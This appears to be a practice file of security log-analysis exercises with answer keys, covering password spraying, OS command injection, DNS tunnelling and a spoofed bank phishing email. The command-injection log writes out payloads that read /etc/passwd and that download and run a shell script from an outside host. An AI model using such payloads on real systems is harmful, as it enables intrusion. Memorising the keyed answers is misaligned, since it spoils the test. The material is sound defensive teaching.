@@ -1,0 +1,141 @@
+# Practice: pbq-logs | Log analysis
+Read the logs, mark every line that shows the attack (a wrong mark takes a point away), then answer the questions.
+
+@logs l01 | Threats, vulnerabilities and mitigations | 6
+Lakeside Supply's staff sign in to webmail and the staff portal through the company's identity provider. Accounts lock after 5 failed passwords in 15 minutes. On Monday morning nobody is locked out, but the SIEM flags unusual sign-in activity overnight. Read the sign-in log, mark the lines that show the attack, then answer the questions.
+@log Identity provider sign-in log (UTC)
+  2026-05-11T01:58:12Z signin user=jparker@lakeside.example app=webmail ip=10.12.4.31 result=success mfa=passed
+* 2026-05-11T02:00:03Z signin user=amorgan@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+* 2026-05-11T02:02:05Z signin user=bnguyen@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+* 2026-05-11T02:04:04Z signin user=cdiaz@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+  2026-05-11T02:05:40Z signin user=svc-backup@lakeside.example app=backup-agent ip=10.12.9.5 result=success mfa=not_applicable
+* 2026-05-11T02:06:06Z signin user=dokafor@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+* 2026-05-11T02:08:02Z signin user=tchen@lakeside.example app=imap-legacy ip=198.51.100.71 result=success mfa=not_supported
+  2026-05-11T02:09:15Z signin user=jparker@lakeside.example app=portal ip=10.12.4.31 result=failure reason=bad_password
+  2026-05-11T02:09:31Z signin user=jparker@lakeside.example app=portal ip=10.12.4.31 result=success mfa=passed
+* 2026-05-11T02:10:07Z signin user=efischer@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+* 2026-05-11T02:12:03Z signin user=fsantos@lakeside.example app=webmail ip=198.51.100.71 result=failure reason=bad_password
+* 2026-05-11T02:31:44Z mailbox user=tchen@lakeside.example action=new_inbox_rule name="." forward_to=archive-77@mailbox.example
+  2026-05-11T07:45:10Z signin user=amorgan@lakeside.example app=webmail ip=10.12.4.18 result=success mfa=passed
+@endlog
+? attack | What attack do the marked failed sign-ins show?
+- A brute-force attack: thousands of guesses against one account
++ Password spraying: one or two common passwords tried against many accounts
+- Credential stuffing with a list of usernames and passwords stolen from another site
+- A pass-the-hash attack inside the network
+? lockout | Why did the account lockout policy not stop the attacker?
+- The attacker used a different IP address for every guess
++ Each account saw only one wrong password, far below the limit of 5 in 15 minutes
+- Lockout policies only apply to administrator accounts
+- The identity provider switched the policy off at night
+?? control | Which TWO changes would BEST stop this attack from working? (Choose two.)
++ Block legacy protocols such as IMAP basic sign-in, which can't do MFA, and require MFA for every sign-in
++ Block common and breached passwords (a banned-password list) when people set a password
+- Lower the lockout limit from 5 to 3 failed passwords
+- Make passwords expire every 30 days
+- Move webmail to a new address
+! Indicators: one outside address, 198.51.100.71, tries one password against a different account about every two minutes (amorgan, bnguyen, cdiaz, dokafor, efischer, fsantos), succeeds for tchen through the legacy IMAP app, which can't ask for MFA, and half an hour later a hidden-looking inbox rule named "." forwards tchen's mail outside (a common step after a mailbox takeover). The office addresses (10.12.x), the backup service and jparker's one typo followed by a success are normal. Attack: many accounts, one try each, slowly, is password spraying; brute force hammers one account, and credential stuffing would show a different password per user from a stolen list, usually many successes or failures in bursts. Lockout: lockout counts failures per account, so one guess per account never reaches 5. Controls: MFA everywhere, with legacy sign-in protocols turned off so MFA can't be skipped, makes a guessed password useless on its own; banning common passwords removes the guesses spraying relies on. A lower lockout limit still never triggers at one try per account, and frequent expiry tends to make people choose weaker, predictable passwords.
+
+@logs l02 | Threats, vulnerabilities and mitigations | 6
+Westbrook Networks' support site has a "network check" page that pings an address the customer types in (/tools/check?host=...). The page runs the system's ping command with that value. A WAF in monitor-only mode logged the requests below. Mark the lines that show the attack, then answer the questions.
+@log Web server access log (support1)
+  192.0.2.61 - - [14/Jul/2026:10:21:07 +0000] "GET /tools/check?host=192.0.2.1 HTTP/1.1" 200 812 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  10.5.0.8 - - [14/Jul/2026:10:21:30 +0000] "GET /status HTTP/1.1" 200 17 "-" "check_http/2.4"
+  198.51.100.30 - - [14/Jul/2026:10:22:12 +0000] "GET /tools/check?host=www.example.com HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)"
+* 203.0.113.140 - - [14/Jul/2026:10:24:51 +0000] "GET /tools/check?host=127.0.0.1%3Bid HTTP/1.1" 200 903 "-" "curl/8.6.0"
+* 203.0.113.140 - - [14/Jul/2026:10:25:03 +0000] "GET /tools/check?host=127.0.0.1%7Ccat%20/etc/passwd HTTP/1.1" 200 2988 "-" "curl/8.6.0"
+  192.0.2.61 - - [14/Jul/2026:10:25:40 +0000] "GET /css/site.css HTTP/1.1" 304 0 "https://support.westbrook.example/tools/check" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+* 203.0.113.140 - - [14/Jul/2026:10:26:18 +0000] "GET /tools/check?host=127.0.0.1%3Bcurl%20-s%20http://198.51.100.250/k.sh%20-o%20/tmp/k.sh HTTP/1.1" 200 860 "-" "curl/8.6.0"
+* 203.0.113.140 - - [14/Jul/2026:10:26:31 +0000] "GET /tools/check?host=127.0.0.1%3Bsh%20/tmp/k.sh HTTP/1.1" 200 851 "-" "curl/8.6.0"
+  10.5.0.8 - - [14/Jul/2026:10:26:40 +0000] "GET /status HTTP/1.1" 200 17 "-" "check_http/2.4"
+  198.51.100.30 - - [14/Jul/2026:10:27:55 +0000] "GET /tools/check?host=198.51.100.1 HTTP/1.1" 200 829 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5)"
+@endlog
+? attack | What attack do the marked lines show?
+- SQL injection against the support database
+- Reflected cross-site scripting in the host parameter
++ OS command injection: extra shell commands added after the address with ; and |
+- Directory traversal to read files outside the web folder
+? impact | The request with |cat /etc/passwd returned 2988 bytes, far more than a normal check. What does that MOST likely mean?
+- The WAF blocked the request and sent a long error page
++ The command ran on the server and the file's contents came back in the page
+- The server ran out of memory and returned a crash report
+- The attacker's browser cached an old copy of the page
+?? fix | Which TWO changes would BEST stop this attack from working again? (Choose two.)
++ Accept only a valid IP address or host name in the host parameter (an allow list of characters) and reject everything else
++ Call ping directly with the address as one argument, never through a shell command line built from user input
+- Switch the site from HTTP to HTTPS
+- Add a CAPTCHA to the support site's sign-in page
+- Keep the access log for a year
+! Indicators: four requests from 203.0.113.140, using curl, where the host value has a URL-encoded ; (%3B) or | (%7C) followed by a command: id (who am I running as), cat /etc/passwd (read a file), curl to download a script, and sh to run it. The normal checks, the CSS file and the monitoring requests to /status are ordinary. Attack: ; and | tell a Unix shell to run another command, so a page that pastes user input into a shell command line runs whatever the attacker adds; that is command injection, not SQL injection (no SQL syntax) and not XSS (no script tags). Impact: a response three times larger than a normal check means the output of cat /etc/passwd was added to the page, so the commands really ran (and the downloaded script probably ran too: the server must be investigated). Fix: strict input validation with an allow list, and running the program without a shell (passing the value as a single argument) remove the injection; HTTPS, a CAPTCHA on another page or longer log retention change nothing about it.
+
+@logs l03 | Security operations | 6
+Every PC at Fernside Insurance must use the internal DNS resolver (10.8.0.53), which writes a query log. The SOC's threat hunt looks for unusual DNS use. Mark the lines that show the suspicious activity, then answer the questions.
+@log Query log of the internal DNS resolver dns1 (10.8.0.53)
+  11-May-2026 14:00:02.114 client 10.8.4.11#50311: query: www.fernside.example IN A +
+* 11-May-2026 14:00:30.002 client 10.8.4.23#53122: query: mzxw6ytboi2dmmrtgq3tsnzy.0001.t.cdnsync-update.example IN TXT +
+  11-May-2026 14:00:41.877 client 10.8.4.11#50318: query: outlook.office.example IN AAAA +
+* 11-May-2026 14:01:30.004 client 10.8.4.23#53140: query: gezdgnbvgy3tqojqgm4dkmzz.0002.t.cdnsync-update.example IN TXT +
+  11-May-2026 14:01:52.390 client 10.8.4.37#61002: query: updates.vendor-av.example IN A +
+* 11-May-2026 14:02:30.001 client 10.8.4.23#53161: query: nfxgg2dfojxw4zlsmvzhizlo.0003.t.cdnsync-update.example IN TXT +
+  11-May-2026 14:02:44.615 client 10.8.4.11#50330: query: intranet.fernside.example IN A +
+* 11-May-2026 14:03:30.003 client 10.8.4.23#53177: query: onxw2zlcmfzwk3dtmvyhi2lp.0004.t.cdnsync-update.example IN TXT +
+  11-May-2026 14:03:58.120 client 10.8.4.37#61011: query: time.fernside.example IN A +
+* 11-May-2026 14:04:30.002 client 10.8.4.23#53190: query: mrsxezlpnzsxe3dsmvzw4ylu.0005.t.cdnsync-update.example IN TXT +
+  11-May-2026 14:05:10.551 client 10.8.4.11#50342: query: www.fernside.example IN A +
+@endlog
+? activity | What do the marked queries MOST likely show?
+- A DNS amplification attack against the resolver
+- DNS cache poisoning of the resolver
++ DNS tunnelling: data hidden in long encoded subdomains, with answers coming back in TXT records
+- A user typing mistyped addresses (typosquatting)
+? beacon | Which detail BEST shows that a program, not a person, is sending these queries?
+- The queries use the TXT record type
++ They arrive exactly every 60 seconds with a counter (0001, 0002 ...) that goes up by one
+- The client uses a different source port each time
+- The domain name ends in .example
+? first | What should the SOC do FIRST?
+- Delete the resolver's query log to save disk space
+- Wait a week to see how much data leaves
++ Isolate 10.8.4.23 from the network and block (sinkhole) cdnsync-update.example on the resolver
+- Reinstall the DNS resolver
+?? prevent | Which TWO controls help MOST against this kind of channel in future? (Choose two.)
++ Block outbound DNS (port 53) at the firewall for everything except the internal resolver
++ DNS filtering that blocks newly registered and low-reputation domains and alerts on long, random-looking names
+- Turn off DNSSEC
+- Give every PC a static IP address
+- Shorten the DHCP lease time
+! Indicators: the five TXT queries from 10.8.4.23 to subdomains of cdnsync-update.example. Each name starts with a long string of letters and digits that looks like encoded data, then a counter, and they come once a minute on the dot. The other PCs' queries are ordinary names of the company and its vendors. Activity: malware can hide data in the names it looks up (the attacker runs the DNS server for that domain, so it receives every query) and get commands back in TXT answers; that is DNS tunnelling, used for command and control or for slow data theft. Amplification and poisoning target the resolver itself, not one client's own queries. Beaconing: a machine checking in at a fixed interval with a sequence number is automated; people don't browse once a minute exactly. TXT records and changing source ports are normal on their own. First: contain the host and cut the channel at once, while keeping the logs as evidence. Prevent: forcing all DNS through the resolver means it can be watched and filtered, and DNS filtering with reputation and pattern checks catches new tunnelling domains. DNSSEC, static addresses and DHCP leases have nothing to do with it.
+
+@logs l04 | Threats, vulnerabilities and mitigations | 6
+A clerk at Northfield Builders reported an email that seems to come from the company's bank, Kestrel Bank, asking her to confirm a large payment. The security team opens the message's full headers. Mark the lines that show the message is not genuine, then answer the questions.
+@log Headers and first line of the reported email
+* Return-Path: <bounce@kestre1bank-secure.example>
+  Received: from mx1.northfield.example (10.40.0.25) by mail.northfield.example with ESMTPS; Tue, 08 Sep 2026 09:14:22 +0000
+* Received: from mail.kestre1bank-secure.example (unknown [203.0.113.144]) by mx1.northfield.example with ESMTP; Tue, 08 Sep 2026 09:14:20 +0000
+* Authentication-Results: mx1.northfield.example; spf=pass smtp.mailfrom=kestre1bank-secure.example; dkim=none; dmarc=fail (p=none) header.from=kestrelbank.example
+  Date: Tue, 08 Sep 2026 09:14:05 +0000
+  From: "Kestrel Bank Payments" <payments@kestrelbank.example>
+* Reply-To: <payments-team@kestrelbank-support.example>
+  To: <accounts@northfield.example>
+  Subject: URGENT: confirm payment of 48,750.00 today
+* Message-ID: <20260908091405.4471@mail.kestre1bank-secure.example>
+  MIME-Version: 1.0
+  Content-Type: text/html; charset=UTF-8
+* Body: Please confirm the payment before 12:00 at https://kestrelbank.example.payment-check.example/confirm
+@endlog
+? spoof | Which header result shows that the From address was faked?
+- spf=pass, because SPF checks the From address the clerk sees
++ dmarc=fail: neither SPF nor DKIM passed for kestrelbank.example, the domain in the From line
+- The Content-Type is text/html
+- The first Received line comes from 10.40.0.25
+? delivered | The message failed DMARC, yet it reached the clerk's inbox. Why?
+- DMARC only checks messages sent inside one company
+- The receiving server never checks DMARC on urgent messages
++ Kestrel Bank's DMARC policy is p=none, which asks receivers only to report failures, not to reject or quarantine them
+- SPF passed, and a pass in SPF always overrides DMARC
+? response | Several staff received the same message. What should the security team do FIRST?
+- Reply to the sender and ask them to stop
+- Tell the clerk to delete the message and do nothing else
++ Remove every copy from staff mailboxes, block the sending and link domains at the email gateway and web filter, and check whether anyone clicked
+- Ask Kestrel Bank to change its DKIM keys
+! Indicators: the Return-Path uses kestre1bank-secure.example (a 1 in place of the l, a lookalike domain); the message entered from 203.0.113.144, a server of that lookalike domain, not of the bank (the Message-ID was made by the same lookalike server); the authentication results show SPF passing only for the lookalike domain, no DKIM signature and a DMARC failure for kestrelbank.example; replies would go to yet another domain; and the link's real domain is payment-check.example (kestrelbank.example is only the start of the host name). The internal Received hop, Date, To and MIME lines are normal; the urgent subject is a social engineering hint but not proof. Spoof: SPF checks the envelope sender (Return-Path), not the visible From, so an attacker can pass SPF with their own domain; DMARC checks that SPF or DKIM passes for a domain aligned with the From line, and here it failed. Delivered: p=none is a monitoring policy; with p=quarantine or p=reject the receiver would have sent it to junk or refused it. Response: this is a phishing campaign against several people, so the team purges all copies, blocks the domains and finds out who clicked or replied (they may need password resets and the payment must be checked with the bank by phone). Replying to the attacker or only deleting one copy leaves the others at risk.
